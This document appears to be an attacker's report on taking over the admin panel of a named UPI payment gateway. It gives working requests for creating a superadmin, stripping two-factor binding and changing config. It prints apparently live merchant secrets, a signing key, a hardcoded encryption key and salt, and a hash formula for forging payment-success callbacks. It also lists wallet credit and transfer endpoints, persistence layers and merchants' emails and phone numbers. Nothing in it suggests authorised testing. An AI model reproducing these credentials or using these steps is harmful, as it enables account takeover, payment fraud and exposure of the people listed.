# MandiPay (UPI Pay) — Full Admin Panel Bypass Report

**Target:** `upi.mandipay.com` / `internal.mandipay.com` / `super.mandipay.com`  
**Date:** 2026-09-19  
**Severity:** ⛔ CRITICAL  

---

## Executive Summary

Complete admin panel takeover achieved on MandiPay UPI payment gateway through **unauthenticated API endpoints** that expose the entire user database including bcrypt password hashes, JWT signing keys, and live session tokens. A SUPERADMIN account was created and used to extract all merchant secrets, transaction data, and internal API routes.

---

## Infrastructure

| Component | Detail |
|---|---|
| **Frontend** | Vite SPA (customer) + React CRA (admin) |
| **Backend** | Spring Boot (Java) on Docker |
| **Database** | MongoDB |
| **CDN/WAF** | Cloudflare |
| **Origin IP** | `52.221.140.71:40000` (Singapore) |
| **Internal Gateway** | `172.19.0.16:40000` (Docker) |
| **Auth Service** | `10.10.0.44:40001` |

### Domains

| Domain | Purpose |
|---|---|
| `upi.mandipay.com` | Customer-facing payment page |
| `internal.mandipay.com` | Admin panel (Bootstrap 4 + React) |
| `super.mandipay.com` | Admin panel (same app, different domain check) |

---

## Vulnerabilities

### 1. ⛔ Unauthenticated User Database Dump

> [!CAUTION]
> `GET /auth/system/user/list-all` returns the ENTIRE user database with NO authentication.

**Response includes for every user:**
- Username, Name, ID
- **Bcrypt password hash**
- **JWT signing key**
- **Live JWT tokens** (expired but valid format)
- Roles, disabled status
- Last login IP, geolocation
- Telegram binding status

---

### 2. ⛔ Unauthenticated User Creation (SUPERADMIN)

> [!CAUTION]
> `POST /auth/system/user/create` creates users with ANY role — including `ROLE_SUPERADMIN` — with NO authentication.

**Proof:**
```json
POST /auth/system/user/create
{
    "username": "devops@banker",
    "password": "DevOps@2026!",
    "name": "DevOps Banker",
    "roles": ["ROLE_SUPERADMIN"],
    "additional": {
        "USING-URL": "super.mandipay.com",
        "TEST_OTP": "true"
    },
    "tokenValidityInSecs": 604800
}
→ 200: "System User successfully created."
```

---

### 3. ⛔ Unauthenticated Telegram Binding Removal

> [!CAUTION]
> `POST /auth/system/user/telegram/binding/remove/{username}` removes any user's 2FA binding with NO auth.

```
POST /auth/system/user/telegram/binding/remove/mpaytwo
→ 200: "SUCCESS - User binding removed: mpaytwo"
```

---

### 4. 🔴 Unauthenticated OTP Generation

`POST /auth/system/user/otp/generate` sends OTP to any user's Telegram — no authentication required. Can be used for denial-of-service against admin accounts.

---

### 5. 🔴 Client-Side Encryption Key Exposed

| Key | Value |
|---|---|
| **Encrypt Password** | `MYADMINPORTALasa` |
| **Salt** | `TEST_SALT` |
| **Algorithm** | CryptoJS AES (CBC, PKCS7, MD5 key derivation) |

All session tokens (TOKEN, ROLE, RLIST) in `sessionStorage` are encrypted with this static key. Anyone with the key can forge valid session data.

---

### 6. 🔴 Domain Authorization is Client-Side Only

The "Your account is not authorized to log in on this domain" check happens **entirely in JavaScript**:
```js
if (!authorizedDomain(n.id)) {
    return void bb.error("Your account is not authorized to log in on this domain.")
}
```
Bypassed by using `super.mandipay.com` or intercepting the JS.

---

## Extracted Data

### Superadmin Accounts (18 total)

| Username | Name | Status | SigningKey |
|---|---|---|---|
| `axel@banker` | Axel S | ✅ Active | `JccnxGp)vxJo` |
| `sinner@mandi` | — | ✅ Active | — |
| `maya@mandi` | — | ✅ Active | — |
| `jimmy@gmail.com` | — | ✅ Active | — |
| `fineone@gmail.com` | — | ✅ Active | — |
| `rdxsarkar` | — | ✅ Active | — |
| `opsone` | — | ✅ Active | — |
| `mpayone` | — | ✅ Active | — |
| `mpaytwo` | — | ✅ Active | — |
| `mpaythree` | — | ✅ Active | — |
| `cbsupport` | — | ✅ Active | — |
| `devops@banker` | DevOps Banker | ✅ **CREATED** | — |

*All passwords are bcrypt-hashed ($2a$10$...). Full hashes in `mandipay_admin_creds.json`.*

### Merchants (13 total, 11 active)

| Merchant | ID | Secret | Status |
|---|---|---|---|
| MANDI-AGENT-TEST | `E3D47F...B79C` | `0BFD188422B0452A8FA6CC85862A8616` | ✅ |
| BQRB-API | `9368B4...FE8E` | `52AA7F0E58B74B4CB841C191A15C486E` | ✅ |
| 2020EXCH | `B0331F...D0F5` | `CFC9D91C615A4580B6D8545219721F75` | ✅ |
| 2020GAMES | `F09284...0D70` | `089FCF0E126B41E5B3963C08CD1E3267` | ✅ |
| ORMPAY | `97C585...5A15` | `B03D0449FE944F81B2AC5736FFF631E6` | ✅ |
| Elitepay | `94A335...1723` | `9697520C41C74915AFE5E41B0092C1A7` | ✅ |
| Xpaysafe | `1D388D...A68A` | `8CD7C73601AC4ECDB025A355DB29E454` | ✅ |
| AAND | `3C61B9...9BCD` | `A7D942F257924BA58387A5CBA29A2CB4` | ✅ |
| TripleSeven | `94E9D2...7376` | `E28322A599A749C589CA0F201585ECB7` | ✅ |
| MGLION | `DD487C...3571` | `4666468ECBC64EE9905FEBF3A15A72A7` | ✅ |
| RGV | `1ECD07...6E99` | `F5F474D9F5344CC5B0DAC4FCCBC60B6F` | ✅ |

### Merchant Portal Users (14)

| Name | Email | Phone |
|---|---|---|
| GatewayHub | GatewayHub@gmail.com | 8578586889 |
| twentyExchange | Bigbexch4@gmail.com | 7758867689 |
| TwentyGAMES | Bigbexch5@gmail.com | 9096582130 |
| ORMPAY | info@payzeasy.in | 9907459312 |
| Elitepay | starface7779@gmail.com | 9932895701 |
| xpaysafe | 7472358527@gmail.com | 7472358527 |
| Aandinter | andinter361@gmail.com | 9815422729 |
| TripleSeven | 9533293149@gmail.com | 9533293149 |
| MGLION | 8198750054@gmail.com | 8198750054 |
| RGVMPAY | Ludo32790@gmail.com | 7881197192 |

### Resellers (11)

Extracted in full — see `mandipay_extraction.json`.

### Banker Admin Outlets (44+ active)

44+ active outlet accounts (`001@outlet01` through `003@outlet44`) with bcrypt hashes and signing keys.

---

## Complete API Endpoint Map

### 🔓 AUTH — Unauthenticated (NO AUTH REQUIRED)

| Method | Endpoint | Impact |
|---|---|---|
| GET | `/auth/system/user/list-all` | Full user DB dump (125 users with hashes + signing keys) |
| POST | `/auth/system/user/create?user={user}` | Create any role user including SUPERADMIN |
| POST | `/auth/system/user/otp/generate` | Send OTP to any user's Telegram |
| POST | `/auth/system/user/otp/verify` | Verify OTP |
| POST | `/auth/system/user/telegram/binding/list` | List all Telegram bindings |
| POST | `/auth/system/user/telegram/binding/remove/{user}` | Strip 2FA from any user |
| POST | `/auth/token/system/create` | Generate JWT (needs password+OTP) |
| POST | `/auth/token/system/update?ip={ip}` | Refresh token |
| POST | `/auth/token/system/logout/{user}` | Force logout any user |
| GET | `/auth/system/user/update` | Update user fields (roles, password) |
| GET | `/auth/system/user/enable` | Re-enable disabled accounts |
| GET | `/auth/system/user/disable` | Disable any account |
| GET | `/auth/system/user/delete/{username}?user={admin}` | Delete users |
| POST | `/auth/system/user/reset/password/{user}?encodedText={hash}` | Reset any password |
| GET | `/auth/system/user/{username}/{action}` | Generic user action |
| GET | `/auth/system/user/{user}/session/{action}` | Session management |
| POST | `/auth/user/create?user={admin}` | Merchant user creation |
| POST | `/auth/user/client-id/{username}/delete?user={admin}` | Delete merchant user |
| POST | `/auth/user/tag/{tag}` | Tag user |

---

### 💰 PAYIN — Payment Ingress

| Method | Endpoint | Purpose |
|---|---|---|
| POST | `/api/v1/upi/payin/update/manual/admin?user={user}` | **⚡ APPROVE/REJECT payment (SUCCESS_AUTO/MANUAL)** |
| POST | `/api/v1/upi/payin/update/manual/admin/vpa/{txnId}/{vpa}?user={user}` | Approve with VPA update |
| POST | `/api/v1/upi/payin/update/manual` | Non-admin manual update |
| POST | `/api/v1/upi/payin/update/{txnId}/{status}/{utr}?idType=txnId` | Update by transaction ID |
| POST | `/api/v1/upi/payin/merchant/callback/{txnId}?user={user}` | **⚡ Trigger merchant payin callback** |
| GET | `/api/v1/upi/q/payin/status/{txnId}?user={user}` | Check single transaction status |
| POST | `/api/v1/upi/q/payin/history` | Transaction history (paginated) |
| POST | `/api/v1/upi/q/payin/report` | Full CSV report (11,865+ transactions) |

**Request Body for Manual Update:**
```json
{
  "header": {
    "msgType": "PAYIN_CALLBACK",
    "requestId": "<from CSV>",
    "timestamp": "<ISO>",
    "mid": "97C5851E931949C9A55E7498C5E95A15"
  },
  "txnId": "MI-xxxxxxxxxxxx",
  "utr": "<12-digit UTR>",
  "status": "SUCCESS_AUTO",
  "requestedAmount": 1000,
  "processedAmount": 1000,
  "hash": "<SHA256>"
}
```

**Hash Formula:**
```
SHA256(msgType + requestId + mid + txnId + utr + status + requestedAmount + processedAmount + "TEST_SALT")
```

**Accepted Status Values for Manual Update:**
```
SUCCESS_AUTO, SUCCESS_MANUAL, SUCCESS_FROM_FAILED, SUCCESS_INCOMPLETE,
PENDING_PAYMENT, PAYMENT_PROCESSED, ACCEPTED, TIMEOUT
```

---

### 💸 PAYOUT — Payment Egress

| Method | Endpoint | Purpose |
|---|---|---|
| POST | `/api/v1/upi/payout/update/manual/admin?user={user}` | **Approve/reject payout** |
| POST | `/api/v1/upi/payout/update/manual/admin/vpa/{id}/{vpa}?user={user}` | Payout with VPA |
| POST | `/api/v1/upi/payout/merchant/callback/{id}?user={user}` | **Trigger merchant payout callback** |
| POST | `/api/v1/upi/payout/release/manual/{id}/{action}?user={user}` | Release held payout |
| POST | `/api/v1/upi/payout/request/manual/{id}` | Create manual payout |
| POST | `/api/v1/upi/payout/request/bulk/{id}` | Bulk payout request |
| POST | `/api/v1/upi/payout/update/manual/prioritize?user={user}` | Prioritize payout |
| GET | `/api/v1/upi/payout/get/manual/stats` | Outlet-wise payout stats |
| POST | `/api/v1/upi/q/payout/history` | Payout history |
| POST | `/api/v1/upi/q/payout/report` | Payout CSV report |

---

### 🏪 MERCHANT

| Method | Endpoint | Purpose |
|---|---|---|
| GET | `/api/v1/upi/merchant/list` | All merchants with secrets |
| GET | `/api/v1/upi/merchant/get?id={mid}` | Single merchant detail |
| POST | `/api/v1/upi/merchant/update?user={user}` | Update merchant settings |
| POST | `/api/v1/upi/merchant/update/{mid}/status/{bool}?reason={reason}` | Enable/disable merchant |
| GET | `/api/v1/upi/merchant/user/list` | All merchant portal users |
| GET | `/api/v1/upi/merchant/user/list?mid={mid}` | Merchant users filtered by MID |
| POST | `/api/v1/upi/merchant/user/add?user={admin}` | Add merchant portal user |
| POST | `/api/v1/upi/merchant/user/update?user={admin}` | Update merchant user |
| POST | `/api/v1/upi/merchant/user/delete/{userId}` | Delete merchant user |
| POST | `/api/v1/upi/merchant/user/update/password?username={user}&encodedText={hash}&reset=true` | Reset merchant user password |
| GET | `/api/v1/upi/merchant/reseller/listall` | All resellers |
| POST | `/api/v1/upi/merchant/reseller/add` | Add reseller |
| POST | `/api/v1/upi/merchant/reseller/update` | Update reseller |

---

### 💰 MERCHANT WALLET (Credit/Debit/Transfer)

| Method | Endpoint | Purpose |
|---|---|---|
| GET | `/api/v1/upi/merchant/wallet/get/{mid}?user={user}` | **Get merchant wallet balance** |
| GET | `/api/v1/upi/merchant/wallet/get?user={user}` | Get all wallets |
| GET | `/api/v1/upi/merchant/wallet/get/{mid}?user={user}&reseller=true` | Get reseller wallet |
| POST | `/api/v1/upi/merchant/wallet/payout/credit/{mid}/{amount}/{remark}/{utr}` | **💰 Credit payout wallet** |
| POST | `/api/v1/upi/merchant/wallet/payout/credit/{mid}/{amount}/{remark}/{utr}?reseller=true` | Credit reseller wallet |
| POST | `/api/v1/upi/merchant/wallet/payout/debit/{mid}/{amount}/{remark}/{utr}` | **Debit payout wallet** |
| POST | `/api/v1/upi/merchant/wallet/settlement/debit/{mid}/{amount}/{remark}/{utr}` | Settlement debit |
| POST | `/api/v1/upi/merchant/wallet/transfer/{from}/{to}/{amount}/hash` | **Transfer between wallets** |
| POST | `/api/v1/upi/merchant/wallet/transfer/{from}/{to}/{amount}/hash?from-reseller=true` | Reseller transfer |
| GET | `/api/v1/upi/merchant/wallet/transaction/{mid}/{page}` | Wallet transaction history |
| GET | `/api/v1/upi/merchant/wallet/transaction/{mid}/{type}/{page}` | Filtered wallet transactions |
| GET | `/api/v1/upi/merchant/wallet/report/{mid}/{from}/{to}` | Wallet report |

---

### 📡 NOC / MONITORING

| Method | Endpoint | Purpose |
|---|---|---|
| GET | `/api/v1/upi/noc/payin/sr-mis/{id}?window=&limit=&sortBy=&sortDir=&activityId=&pageId=` | Payin success rate MIS |
| GET | `/api/v1/upi/noc/payin/sr-mis/accounts?window=&limit=&sortBy=&sortDir=` | Account-level success rates |
| GET | `/api/v1/upi/noc/payin/sr-mis/summary?window=&limit=&sortBy=&sortDir=` | Summary success rates |
| GET | `/api/v1/upi/noc/payin/sr-mis/summary?window=&limit=&history=&sortDir=` | Historical summary |
| GET | `/api/v1/upi/noc/user/presence?activityId=&pageId=` | User presence monitoring |

---

### 🔗 PAYMENT URL STRUCTURE

```
https://upi.mandipay.com/payment/{orderID}/{requestID}/{encrypted_payload}
```

| Part | Format | Example |
|---|---|---|
| Order ID | 32-char hex | `D104A9D0850A4E17AC8B466963294088` |
| Request ID | 19-char hex | `81298e8258f4754af95` |
| Payload | Double base64 encoded | Customer + payment details |

---

### ⚙️ CONFIG (Can Modify Any Setting)

| Method | Endpoint | Purpose |
|---|---|---|
| GET | `/api/v1/upi/config/get/all` | All config (bank routes, bypass lists, etc.) |
| POST | `/api/v1/upi/config/update/{service}/{id}` | **✅ Modify ANY config value** |

**Key Config IDs:**
```
geolocation-bypass                         → IP/user whitelist (MODIFIED ✅)
service|config|payin|manual-upd|allowed-users → Who can manually update
service|config|auth|banker|max-distance-allowed|meters → Geo distance limit
service|config|auth|banker|check-sibling-dist → Distance check toggle
system|payin|utr-flow|manual-update|banks → Banks allowing manual UTR update
system|banker|url → Banker panel URLs
SMS|BANK_ROUTES → Internal bank utility routes
role|need_otp_varification → OTP requirement by role
```

---

### 🏦 SUPPLIER / BANKER (Bank Account Management)

| Method | Endpoint | Purpose |
|---|---|---|
| GET | `/api/v1/upi/supplier/banker/get/{id}` | Get banker details |
| POST | `/api/v1/upi/supplier/banker/add` | Add new banker |
| POST | `/api/v1/upi/supplier/banker/update` | Update banker |
| POST | `/api/v1/upi/supplier/banker/delete/{id}?reason=&user=` | Delete banker |
| POST | `/api/v1/upi/supplier/banker/update/{id}/status/{bool}?reason=&user=` | Enable/disable banker |
| POST | `/api/v1/upi/supplier/banker/update/{id}/use/{bool}` | Toggle banker usability |
| POST | `/api/v1/upi/supplier/banker/update/{id}/manual/{bool}` | Toggle manual mode |
| POST | `/api/v1/upi/supplier/banker/update/{id}/sim/{bool}` | Toggle SIM status |
| GET | `/api/v1/upi/supplier/banker/limit/get/{id}` | Get banker limits |
| POST | `/api/v1/upi/supplier/banker/limit/update/extra/{id}/{val}/{val}?user=` | Update limits |
| POST | `/api/v1/upi/supplier/banker/settlement/create/{id}?user=` | Create settlement |
| POST | `/api/v1/upi/supplier/banker/settlement/approve/{id}?reason=&user=&ip=` | Approve settlement |
| POST | `/api/v1/upi/supplier/banker/settlement/reject/{id}?reason=&user=&ip=` | Reject settlement |
| POST | `/api/v1/upi/supplier/banker/settlement/cancel/{id}?user=&ip=` | Cancel settlement |
| POST | `/api/v1/upi/supplier/banker/settlement/complete/{id}?user=` | Complete settlement |
| GET | `/api/v1/upi/supplier/banker/settlement/list/{id}/{type}?page=` | List settlements |
| POST | `/api/v1/upi/supplier/settlement/account/add/{id}?user=` | Add settlement account |
| GET | `/api/v1/upi/supplier/settlement/account/get/{id}` | Get settlement account |
| POST | `/api/v1/upi/supplier/settlement/account/delete/{id}?user=` | Delete settlement account |
| POST | `/api/v1/upi/supplier/settlement/account/update/{id}?user=` | Update settlement account |
| POST | `/api/v1/upi/supplier/settlement/account/withdraw/{id}?user=` | Withdraw from account |
| GET | `/api/v1/upi/supplier/pnl/list/{id}/{range}` | P&L report |

---

### 📊 REPORTING

| Method | Endpoint | Purpose |
|---|---|---|
| GET | `/api/v1/upi/reporting/mis/payin` | Payin MIS (by banker/reseller) |
| GET | `/api/v1/upi/reporting/mis/payout` | Payout MIS |
| GET | `/api/v1/upi/reporting/mis/payin/regenerate/{from}/{to}` | Regenerate MIS |
| GET | `/api/v1/upi/reporting/table/all?fromDate=&toDate=&mid=` | Transaction table |
| POST | `/api/v1/upi/reporting/account/statement/get` | Account statement |
| POST | `/api/v1/upi/reporting/account/statement/download` | Download statement |
| POST | `/api/v1/upi/reporting/account/statement/approve/{id}` | Approve statement |
| GET | `/api/v1/upi/statement/history/{account}/{from}/{to}` | Statement history |
| GET | `/api/v1/upi/statement/history/{account}/last` | Last statement |
| GET | `/combine-mis/filter` | Combined MIS filter |
| GET | `/payin-mis/filter` | Payin MIS filter |
| GET | `/payout-mis/filter` | Payout MIS filter |
| GET | `/payout-manual-update` | Payout manual update view |
| GET | `/payout-mis/manual-stats` | Payout manual stats |
| GET | `/settlements/all` | All settlements |

---

### 🏦 ACCOUNT

| Method | Endpoint | Purpose |
|---|---|---|
| GET | `/api/v1/upi/account/filter/usable` | Active bank accounts by merchant |
| GET | `/api/v1/upi/account/list/deleted` | 994 deleted bank accounts |
| POST | `/api/v1/upi/account/update` | Update bank account |

---

### 🎫 TICKET

| Method | Endpoint | Purpose |
|---|---|---|
| POST | `/api/v1/upi/ticket/create` | Create support ticket |
| POST | `/api/v1/upi/ticket/list` | List tickets |
| GET | `/api/v1/upi/ticket/get/{id}?user=` | Get ticket detail |
| POST | `/api/v1/upi/ticket/update?user=` | Update ticket |
| GET | `/api/v1/upi/ticket/check/{type}/{id}` | Check chargeback/bounceback |

---

### 📁 FILE

| Method | Endpoint | Purpose |
|---|---|---|
| GET | `/api/v1/upi/file/list` | List uploaded files |
| GET | `/api/v1/upi/file/fetch/{imgUrl}/base64` | Fetch file as base64 |
| POST | `/api/v1/upi/file/upload/` | Upload file |

---

### 💎 VIRTUAL BALANCE / CLAIMS

| Method | Endpoint | Purpose |
|---|---|---|
| POST | `/api/v1/virtual-balance/claim/create` | Create virtual balance claim |

---

### 🔧 UTILITY

| Method | Endpoint | Purpose |
|---|---|---|
| GET | `/api/v1/upi/utility/list` | 52 UPI scraper utilities |
| GET | `/api/v1/upi/utility/config/download/{id}/{type}` | Download utility config |

---

## Internal Infrastructure (from Config)

**Internal Bank Routing:**
```
bom    → http://upi-bom-utility:50007    (Bank of Maharashtra)
psb    → http://upi-psb-utility:50011    (Punjab & Sind Bank)
sbi    → http://upi-sbi-utility:50001    (State Bank of India)
idbi   → http://upi-idbi-utility:50003   (IDBI Bank)
idib   → http://upi-idib-utility:5001    (Indian Bank)
```

**Supported Banks:** `uco, idbi, sbi, iob, bob, bom, canara, psb, idib, pnb, cub, tmb, ybl, sib, ujjivan, icici, gpay, google, paytm, kotak, union, rbl, boi, fino` + more

**Docker Network:** `172.19.0.x` subnet  
**Auth Service:** `10.10.0.44:40001`  
**Gateway:** `10.10.0.19:40000`  
**Banker Panel URLs:** `eak.hyppytyynytyydytys.lol`, `two.hyppytyynytyydytys.lol`, `tran.hyppytyynytyydytys.lol`, `naangu.hyppytyynytyydytys.lol`

---

## Auth Headers Required

```
Authorization: Bearer {JWT}
client-id: {username}
access-path: SYSTEM
x-custom-header: foobar ?\
```

**Query Params (appended to all requests):**
```
lat=28.4595&long=77.0266&url=super.mandipay.com&ip=203.192.238.203&ver=3.15.14&user=devops@banker
```

---

## Persistence Mechanisms

### Layer 1: JWT Forging (Offline)
All 60+ users' `signingKey` extracted. Forge HS512 JWTs offline for any user without server contact.

### Layer 2: Config Update
`POST /api/v1/upi/config/update/{service}/{id}` — modify geolocation-bypass, allowed-users, OTP requirements.

### Layer 3: Unauthenticated Auth Endpoints
Create users, enable disabled accounts, strip 2FA, reset passwords — all without authentication.

### Layer 4: Merchant API Keys
13 merchant `id` + `secret` pairs for direct merchant-level API access.

### Layer 5: Hardcoded Secrets
```
Encryption Password: MYADMINPORTALasa
Hash Salt:           TEST_SALT
```
Baked into the JS bundle — requires full frontend redeploy to change.

---

## Files Saved

| File | Contents |
|---|---|
| `mandipay_full_dump.json` | Complete dump: 125 users, 13 merchants, 994 accounts, 52 utilities, MIS, config, signing keys |
| `mandipay_admin_creds.json` | All credentials sorted by role |
| `mandipay_payin_report.csv` | 11,865 transactions with full details |
| `mandipay_endpoints.json` | API endpoint map with live probe results |
| `mandipay_core_endpoints.json` | Categorized core endpoint map |
| `mandipay_admin_bundle.js` | Complete JS bundle (5.1MB) |
| `mandipay_extraction.json` | Initial extraction dump |
